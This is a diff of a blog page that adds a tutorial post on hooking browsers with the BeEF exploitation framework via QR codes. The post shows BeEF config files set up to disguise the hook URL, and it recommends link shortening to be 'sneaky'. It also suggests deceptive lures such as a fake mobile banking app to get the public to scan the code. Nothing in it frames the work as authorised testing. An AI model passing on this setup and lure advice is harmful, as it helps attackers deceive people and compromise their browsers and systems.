@@ -9,7 +9,7 @@
   <meta name="author" content="Matt">
 
   
-  <meta name="description" content="Tweet A Beginner&#8217;s Guide to Tubular Lock Picking http://www.youtube.com/watch?v=ulzZ9T2oGPE Tweet Building a Network Implant With a Raspberry &hellip;">
+  <meta name="description" content="Tweet Hooking Browsers With BeEF & QR Codes For those unfamiliar with the Browser Exploitation Framework Project, or BeEF, it is a tool that can be &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -95,6 +95,89 @@
   </header>
   <section id="main">
       
+  
+  
+    <article class="post">
+      <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/blog/page/3/index.html" data-via="mchandx" data-counturl="http://cubalo.github.io/blog/page/3/index.html" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+      
+  <header>
+    
+      <h2 class="entry-title">
+        
+        <a href="/blog/2013/04/12/fun-with-beef-qr-codes/">Hooking Browsers With BeEF & QR Codes</a>
+        
+      </h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-04-12T00:00:00-04:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <p>For those unfamiliar with the Browser Exploitation Framework Project, or BeEF, it is a tool that can be used to launch attacks against the often only door left open, the web browser. Once the browser is compromised, BeEF can launch further attacks to control the system. While some of us know not to scan any QR code we find, most people assume that they are safe. You can find them posted all around. Sales circulars, marketing materials, magazines, they&#8217;re everywhere. Why not take advantage of that inherent trust?</p>
+<p>For this tutorial, I&#8217;m going to assume that you are running Backtrack 5 R3 or Kali. If not, installation instructions can be found <a href="https://github.com/beefproject/beef/wiki/Installation">here</a>.</p>
+<h1>customhook</h1>
+<p>First things first, we need to edit the customhook config. When BeEF fires up, it sets the hook location to your.i.p.address/hook/ which is pretty obvious. So by editing the config, we can set a custom name for our hook and make it a little less conspicuous. The config can be found at $BEEF_ROOT/extensions/customhook/config.yaml. Pop that open with your favorite editor and change the values to whatever you want. Its pretty self-explanatory.</p>
+<pre>#
+# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
+#
+beef:
+    extension:
+        customhook:
+            enable: true
+            name: 'Custom Hook Point with iFrame Impersonation'
+            customhook_path: "/notice"
+            customhook_target: "http://heyyeyaaeyaaaeyaeyaa.com/"
+            customhook_title: "Notice"</pre>
+<p>Make sure you set &#8220;enable:&#8221; to true.</p>
+<h1>qrcode</h1>
+<p>Next, we need to edit the qrcode extension&#8217;s config. All you need to do here is set &#8220;enable:&#8221; to true and set the &#8220;target:&#8221; to your customhook location (or a bit.ly link of it if you&#8217;re feeling extra sneaky ;) ). It can be found at $BEEF_ROOT/extensions/qrcode/config.yaml.</p>
+<pre>#
+# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
+#
+beef:
+    extension:
+        qrcode:
+            name: 'QR Code Generator'
+            enable: true
+            authors: ["xntrik"]
+            target: ["mybeefserver.com/notice"]
+            qrsize: "300x300"</pre>
+<p>Now when you start BeEF, it will generate a QR code for your hook. You can also append the URL of your customhook to https://chart.googleapis.com/chart?cht=qr&amp;chs=300x300&amp;chl= and it&#8217;ll generate a code for you.</p>
+<h1>Attack!</h1>
+<p>Once you fire up BeEF after making the changes, it will create your custom hook in the location your set as well as provide you a URL where you can download your QR code from. Now the only thing left to do is figure out how you want to use it. &#8220;Scan this to try our new mobile banking app for your iPhone!&#8221; The possibilities are endless.</p>
+
+  
+  
+
+
+    </article>
   
   
     <article class="post">
